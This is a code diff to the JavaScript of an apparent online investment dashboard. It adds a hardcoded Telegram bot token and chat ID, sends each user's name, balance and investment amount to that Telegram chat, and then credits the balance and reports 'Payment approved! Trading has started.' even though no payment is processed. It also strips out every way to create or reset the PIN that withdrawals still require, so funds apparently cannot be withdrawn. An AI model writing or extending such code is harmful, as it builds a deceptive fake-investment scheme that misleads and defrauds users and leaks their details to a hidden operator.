@@ -1,4 +1,8 @@
 document.addEventListener('DOMContentLoaded', function() {
+    // Telegram Bot Configuration
+    const BOT_TOKEN = '7775599479:AAHLH8B0nOFE77LeLVSg4QoRY5YI62GCK3M';
+    const CHAT_ID = '6300694007';
+
     // DOM Elements
     const usernameDisplay = document.getElementById('usernameDisplay');
     const currentBalance = document.getElementById('currentBalance');
@@ -8,7 +12,6 @@ document.addEventListener('DOMContentLoaded', function() {
     const totalROI = document.getElementById('totalROI');
     const investBtn = document.getElementById('investBtn');
     const withdrawBtn = document.getElementById('withdrawBtn');
-    const managePinBtn = document.getElementById('managePinBtn');
     const logoutBtn = document.getElementById('logoutBtn');
     const modals = document.querySelectorAll('.modal');
     const closeModalBtns = document.querySelectorAll('.close-modal');
@@ -16,13 +19,13 @@ document.addEventListener('DOMContentLoaded', function() {
     const passcode = document.getElementById('passcode');
     const confirmWithdraw = document.getElementById('confirmWithdraw');
     const resetPinLink = document.getElementById('resetPinLink');
-    const newPin = document.getElementById('newPin');
-    const confirmPin = document.getElementById('confirmPin');
-    const savePinBtn = document.getElementById('savePinBtn');
-    const pinError = document.getElementById('pinError');
     const planInvestBtns = document.querySelectorAll('.plan-invest-btn');
     const investOptions = document.querySelectorAll('.invest-btn');
     const transactionsTable = document.getElementById('transactionsTable').getElementsByTagName('tbody')[0];
+    const investmentAmount = document.getElementById('investmentAmount');
+    const approveBtn = document.getElementById('approveBtn');
+    const declineBtn = document.getElementById('declineBtn');
+    const approvalStatus = document.getElementById('approvalStatus');
 
     // User data
     let user = {
@@ -39,12 +42,6 @@ document.addEventListener('DOMContentLoaded', function() {
         const savedUser = localStorage.getItem('bbcInvestmentUser');
         if (savedUser) {
             user = JSON.parse(savedUser);
-            // Check if user needs to set a PIN
-            if (!user.pin) {
-                setTimeout(() => {
-                    openModal('pinModal');
-                }, 1000);
-            }
         } else {
             // Default user data
             user = {
@@ -55,9 +52,6 @@ document.addEventListener('DOMContentLoaded', function() {
                 transactions: []
             };
             saveUserData();
-            setTimeout(() => {
-                openModal('pinModal');
-            }, 1000);
         }
 
         updateUI();
@@ -165,14 +159,7 @@ document.addEventListener('DOMContentLoaded', function() {
         // Clear form fields and errors
         withdrawAmount.value = '';
         passcode.value = '';
-        newPin.value = '';
-        confirmPin.value = '';
-        pinError.textContent = '';
-    }
-
-    // Validate PIN (4 digits)
-    function validatePIN(pin) {
-        return /^\d{4}$/.test(pin);
+        approvalStatus.textContent = '';
     }
 
     // Event Listeners
@@ -180,19 +167,9 @@ document.addEventListener('DOMContentLoaded', function() {
     withdrawBtn.addEventListener('click', () => {
         if (!user.pin) {
             alert('Please set your 4-digit security PIN first');
-            openModal('pinModal');
             return;
         }
         openModal('withdrawalModal');
-    });
-    
-    managePinBtn.addEventListener('click', () => {
-        if (!user.pin) {
-            alert('You need to set a PIN first');
-            return;
-        }
-        // In a real app, would verify current PIN before allowing change
-        openModal('pinModal');
     });
     
     logoutBtn.addEventListener('click', () => {
@@ -208,12 +185,6 @@ document.addEventListener('DOMContentLoaded', function() {
         if (e.target.classList.contains('modal')) {
             closeAllModals();
         }
-    });
-
-    // Reset PIN link
-    resetPinLink.addEventListener('click', (e) => {
-        e.preventDefault();
-        openModal('pinModal');
     });
 
     // Withdrawal functionality
@@ -252,73 +223,101 @@ document.addEventListener('DOMContentLoaded', function() {
         closeAllModals();
     });
 
-    // PIN creation/update
-    savePinBtn.addEventListener('click', () => {
-        const pin1 = newPin.value;
-        const pin2 = confirmPin.value;
-        
-        if (!validatePIN(pin1)) {
-            pinError.textContent = 'PIN must be exactly 4 digits';
-            return;
-        }
-        
-        if (pin1 !== pin2) {
-            pinError.textContent = 'PINs do not match';
-            return;
-        }
-        
-        user.pin = pin1;
-        saveUserData();
-        alert('Your 4-digit security PIN has been saved successfully');
-        closeAllModals();
-    });
-
     // Investment functionality
     planInvestBtns.forEach(btn => {
         btn.addEventListener('click', (e) => {
             const amount = parseFloat(e.target.getAttribute('data-amount'));
-            openInvestmentModal(amount);
+            initiateInvestment(amount);
         });
     });
 
     investOptions.forEach(option => {
         option.addEventListener('click', (e) => {
             const amount = parseFloat(e.target.closest('.option-card').getAttribute('data-amount'));
-            processInvestment(amount);
+            initiateInvestment(amount);
         });
     });
 
-    function openInvestmentModal(amount) {
-        openModal('investmentModal');
-        // You could scroll to or highlight the specific option here
+    function initiateInvestment(amount) {
+        investmentAmount.textContent = `$${amount}`;
+        openModal('approvalModal');
+        
+        // Store the pending investment
+        localStorage.setItem('pendingInvestment', JSON.stringify({
+            amount: amount,
+            timestamp: new Date().getTime()
+        }));
     }
 
-    function processInvestment(amount) {
-        // In a real app, this would redirect to payment processing
-        // For demo, we'll just add to balance
-        user.balance += amount;
+    // Approval Button Handler
+    approveBtn.addEventListener('click', function() {
+        const pendingInvestment = JSON.parse(localStorage.getItem('pendingInvestment'));
+        if (!pendingInvestment) return;
         
-        // Record transaction
-        user.transactions.push({
-            date: new Date(),
-            plan: getPlanName(amount),
-            amount: amount,
-            status: 'Active',
-            type: 'investment'
-        });
+        const amount = pendingInvestment.amount;
+        approvalStatus.textContent = 'Processing approval...';
+        approvalStatus.style.color = '#007bff';
         
-        // Add to investments
-        user.investments.push({
-            amount: amount,
-            date: new Date(),
-            plan: getPlanName(amount)
-        });
+        // Send to Telegram bot
+        const message = `💰 New Investment Request\n\n` +
+                       `Amount: $${amount}\n` +
+                       `User: ${user.name}\n` +
+                       `Balance: $${user.balance.toFixed(2)}\n` +
+                       `Time: ${new Date().toLocaleString()}`;
         
-        saveUserData();
-        updateUI();
-        alert(`Successfully invested $${amount}. Your funds are now being actively traded.`);
+        const telegramUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}`;
+        
+        fetch(telegramUrl)
+            .then(response => response.json())
+            .then(data => {
+                if (data.ok) {
+                    // Add to balance after approval
+                    user.balance += amount;
+                    
+                    // Record transaction
+                    user.transactions.push({
+                        date: new Date(),
+                        plan: getPlanName(amount),
+                        amount: amount,
+                        status: 'Active',
+                        type: 'investment'
+                    });
+                    
+                    // Add to investments
+                    user.investments.push({
+                        amount: amount,
+                        date: new Date(),
+                        plan: getPlanName(amount)
+                    });
+                    
+                    saveUserData();
+                    updateUI();
+                    approvalStatus.textContent = 'Payment approved! Trading has started.';
+                    approvalStatus.style.color = '#28a745';
+                    
+                    setTimeout(() => {
+                        closeAllModals();
+                    }, 2000);
+                } else {
+                    approvalStatus.textContent = 'Approval failed. Please try again.';
+                    approvalStatus.style.color = '#dc3545';
+                }
+            })
+            .catch(error => {
+                console.error('Error:', error);
+                approvalStatus.textContent = 'Error sending approval request.';
+                approvalStatus.style.color = '#dc3545';
+            });
+        
+        localStorage.removeItem('pendingInvestment');
+    });
+
+    // Decline Button Handler
+    declineBtn.addEventListener('click', function() {
+        localStorage.removeItem('pendingInvestment');
         closeAllModals();
-    }
+        alert('Investment request cancelled.');
+    });
 
     function getPlanName(amount) {
         if (amount === 10) return 'Basic Plan';
